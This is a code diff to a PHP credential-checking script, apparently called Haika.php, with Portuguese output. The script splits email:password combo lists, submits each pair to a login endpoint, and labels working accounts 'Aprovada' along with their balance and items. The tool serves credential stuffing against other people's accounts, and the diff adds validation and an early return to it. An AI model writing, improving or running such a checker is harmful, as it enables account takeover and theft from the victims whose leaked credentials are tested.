@@ -25,6 +25,13 @@ $explode = multiexplode(array(':', '|', '/', '>'), $lista);
 $email = $explode[0];
 $senha = $explode[1];
 
+if(is_null($email) or empty($senha)){
+echo '<br><span class="badge badge-danger">Error</span> => [Email E Senha Invalidos] => <span class="badge badge-light">@Haika.php</span></br>';
+}
+if (strpos($email, '@') === false) {
+  echo '<br><span class="badge badge-danger">Error</span> => [Email Invalido] => <span class="badge badge-light">@Haika.php</span></br>';
+}
+
 $post = [
     "email" => $email,
     "password" => $senha
@@ -96,7 +103,8 @@ $itens = "Sem Itens.";
 }
 
 if(stripos($fim, 'items')){
-    echo '<span class="badge badge-success">#Aprovada</span> '.$email.'|'.$senha.' | <span class="badge badge-info">Retorno:</span> [ Login Efetuado Com Sucesso! ] | </span> <span class="badge badge-info">Saldo:</span> '.$saldo.' | <span class="badge badge-info">Saldo Afiniação:</span> '.$saldo2.'</span> | <span class="badge badge-info">Itens:</span> '.$itens.' | <span class="badge badge-light">@Haika.php</span></br>';   
+    echo '<span class="badge badge-success">#Aprovada</span> '.$email.'|'.$senha.' | <span class="badge badge-info">Retorno:</span> [ Login Efetuado Com Sucesso! ] | </span> <span class="badge badge-info">Saldo:</span> '.$saldo.' | <span class="badge badge-info">Saldo Afiniação:</span> '.$saldo2.'</span> | <span class="badge badge-info">Itens:</span> '.$itens.' | <span class="badge badge-light">@Haika.php</span></br>'; 
+    return;
 }
 else{
 echo '<br><span class="badge badge-danger">Reprovada</span> '.$email.'|'.$senha.' | <span class="badge badge-info">Retorno:</span> [ '.$retorno.' ] | <span class="badge badge-light">@Haika.php</span></br>';
